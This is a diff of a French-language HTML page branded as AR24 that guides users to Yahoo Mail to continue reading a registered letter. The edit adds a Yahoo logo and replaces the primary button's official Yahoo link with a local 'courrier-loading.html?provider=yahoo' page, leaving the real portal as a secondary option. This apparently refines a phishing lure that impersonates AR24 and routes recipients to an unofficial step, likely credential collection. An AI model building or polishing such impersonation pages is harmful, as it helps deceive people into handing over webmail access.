@@ -11,7 +11,8 @@
       .info-wrapper { min-height: calc(100vh - 260px); display: flex; justify-content: center; align-items: center; padding: 40px 16px; }
       .info-card { width: min(100%, 680px); padding: 38px 28px; border-radius: 28px; background: #ffffff; box-shadow: 0 24px 60px rgba(17, 24, 39, 0.12); }
       .info-head { display: flex; align-items: center; gap: 18px; margin-bottom: 22px; }
-      .provider-badge { width: 72px; height: 72px; border-radius: 22px; display: grid; place-items: center; background: #f5ecff; color: #6d28d9; font-weight: 700; font-size: 1.5rem; flex-shrink: 0; }
+      .provider-badge { width: 72px; height: 72px; border-radius: 22px; display: grid; place-items: center; background: #f8fafc; flex-shrink: 0; overflow: hidden; }
+      .provider-badge svg { width: 42px; height: 42px; }
       .info-title { margin: 0 0 6px; font-family: 'Montserrat', sans-serif; font-size: clamp(1.7rem, 4vw, 2.4rem); }
       .info-subtitle { margin: 0; color: #667085; }
       .info-body { color: #101828; }
@@ -22,34 +23,8 @@
       .note { margin-top: 18px; color: #667085; font-size: .96rem; }
     </style>
   </head>
-  <body class="guest">
-    <header id="header"><div class="wrapper"><a href="#" class="header-logo">AR24 - Lettre Recommandée Électronique</a></div></header>
-    <main id="main-content">
-      <div class="info-wrapper">
-        <section class="info-card">
-          <div class="info-head">
-            <div class="provider-badge" aria-hidden="true">Y!</div>
-            <div>
-              <h1 class="info-title">AR24 et Yahoo</h1>
-              <p class="info-subtitle">Informations pratiques pour poursuivre la consultation via Yahoo.</p>
-            </div>
-          </div>
-          <div class="info-body">
-            <p>Yahoo Mail permet de retrouver rapidement la notification AR24 et de poursuivre la lecture du recommandé depuis les services officiels.</p>
-            <ol class="steps">
-              <li>Ouvrir Yahoo Mail depuis le site officiel.</li>
-              <li>Vérifier vos nouveaux messages ou dossiers de tri.</li>
-              <li>Utiliser les indications AR24 pour continuer votre parcours.</li>
-            </ol>
-            <div class="info-actions">
-              <a class="btn btn-primary" href="https://mail.yahoo.com/" target="_blank" rel="noopener noreferrer">Ouvrir Yahoo</a>
-              <a class="btn" href="webmail.html">Choisir un autre webmail</a>
-            </div>
-            <p class="note">Cette page fournit uniquement des informations d’orientation et renvoie, si nécessaire, vers le portail officiel du service sélectionné.</p>
-          </div>
-        </section>
-      </div>
-    </main>
+  <body class="guest"><header id="header"><div class="wrapper"><a href="#" class="header-logo">AR24 - Lettre Recommandée Électronique</a></div></header>
+    <main id="main-content"><div class="info-wrapper"><section class="info-card"><div class="info-head"><div class="provider-badge" aria-hidden="true"><svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path fill="#6001D2" d="M16 10h8l3 8 3-8h8l-8 18v10h-8V28z"/><circle cx="33" cy="34" r="4" fill="#6001D2"/></svg></div><div><h1 class="info-title">AR24 et Yahoo</h1><p class="info-subtitle">Informations pratiques pour poursuivre la consultation via Yahoo.</p></div></div><div class="info-body"><p>Yahoo Mail permet de retrouver rapidement la notification AR24 et de poursuivre la lecture du recommandé depuis les services officiels.</p><ol class="steps"><li>Ouvrir Yahoo Mail depuis le site officiel.</li><li>Vérifier vos nouveaux messages ou dossiers de tri.</li><li>Utiliser les indications AR24 pour continuer votre parcours.</li></ol><div class="info-actions"><a class="btn btn-primary" href="courrier-loading.html?provider=yahoo">Continuer</a><a class="btn" href="https://mail.yahoo.com/" target="_blank" rel="noopener noreferrer">Portail officiel</a><a class="btn" href="webmail.html">Choisir un autre webmail</a></div><p class="note">Cette page fournit uniquement des informations d’orientation et renvoie, si nécessaire, vers le portail officiel du service sélectionné.</p></div></section></div></main>
     <footer id="footer"><div class="wrapper"><div class="top"><div class="logo"><img alt="" src="/static/images/logo/AR24.svg" /></div><div class="line"><div>Votre solution d'envoi de recommandés électroniques fiable, pratique et efficace.</div><div>AR24 est une filiale de Docaposte</div></div></div></div></footer>
     <script src="//code.tidio.co/7infjs1hu3tvvi6swicmo9klmhijsizg.js" async></script>
   </body>
